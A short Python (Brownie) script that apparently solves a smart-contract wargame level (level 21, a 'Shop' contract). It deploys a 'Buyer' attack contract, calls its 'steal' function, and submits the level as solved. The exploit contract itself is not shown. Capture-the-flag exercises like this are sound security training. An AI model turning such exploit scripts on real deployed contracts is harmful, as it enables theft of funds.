from brownie import (
    network,
    accounts,
    config,
    interface,
    Contract,
    Buyer,
)
from scripts.helpful_scripts import (
    get_account,
    get_new_instance,
    submit_instance,
)
from web3 import Web3


def main():
    player = get_account()
    instance_address = get_new_instance(level_id=21, player=player)

    shop_contract = interface.IShop(instance_address)
    buyer_contract = Buyer.deploy(shop_contract, {"from": player})

    tx = buyer_contract.steal({"from": player})
    tx.wait(1)

    submit_instance(instance_address, player)
